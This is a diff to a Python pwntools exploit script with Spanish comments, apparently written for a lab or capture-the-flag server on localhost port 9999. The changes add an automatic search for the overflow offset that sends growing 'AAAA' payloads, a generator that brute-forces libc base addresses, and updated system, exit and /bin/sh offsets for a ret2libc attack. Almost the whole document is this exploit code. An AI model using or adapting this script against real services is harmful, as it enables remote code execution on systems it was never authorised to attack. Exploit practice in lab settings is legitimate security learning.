@@ -6,6 +6,9 @@ from pwn import *
 HOST = "localhost"
 PORT = 9999
 
+def generar_direcciones_libc(base_start=0xf7d00000, base_end=0xf7f00000, page_size=0x1000):
+    return [addr for addr in range(base_start, base_end, page_size)]
+    
 def send_payload(payload_data):
     """
     Send payload to target server and receive response.
@@ -23,7 +26,6 @@ def send_payload(payload_data):
         response = sock.recv(2048)
         if response:
             print(f"Response: {response}")
-            print("IT WORKED!")
             return True
         # Wait before next attempt
         # time.sleep(0.1)
@@ -34,11 +36,38 @@ def send_payload(payload_data):
     return False
 
 
-libc = ELF("/usr/lib32/libc.so.6")  # usa la misma que el servidor
+
+def calcular_offset():
+    """
+    Calculate the offset for the payload.
+    """
+    # This is a placeholder function. The actual implementation will depend on the target binary.
+    # For example, you might want to use gdb or another tool to find the correct offset.
+    i = 1
+    while True:
+        # print(f"Trying offset: {i}")
+        PAYLOAD = b"AAAA" * i
+        RESPONSE = send_payload(PAYLOAD)
+        if not RESPONSE:
+            print(f"[+] GOT IT: offset = {i}")
+            return (i-1) * 4
+            break
+        i += 1
+    
+    return 
+
+
+
+
+offset = calcular_offset()
+
+
+
+libc = ELF("/lib32/libc.so.6")  # usa la misma que el servidor
 system_offset = libc.symbols["system"]
 exit_offset = libc.symbols["exit"]
-binsh_offset = 0x1cbed2  # next(libc.search(b"ls"))
-offset = 136
+binsh_offset =  0x18dc9b + 0x9 # next(libc.search(b"ls")) #
+# offset = 148
 
 print(f"system_offset: {hex(system_offset)}")
 print(f"exit_offset: {hex(exit_offset)}")
@@ -49,7 +78,7 @@ print(f"system: {hex(libc.address + system_offset)}")
 
 
 
-libc_base_guesses = [addr for addr in range(0xf7c00000, 0xf7e00000 + 0x1000, 0x1000)]
+libc_base_guesses = generar_direcciones_libc()
 
 print(f"Guesses: {len(libc_base_guesses)}")
 
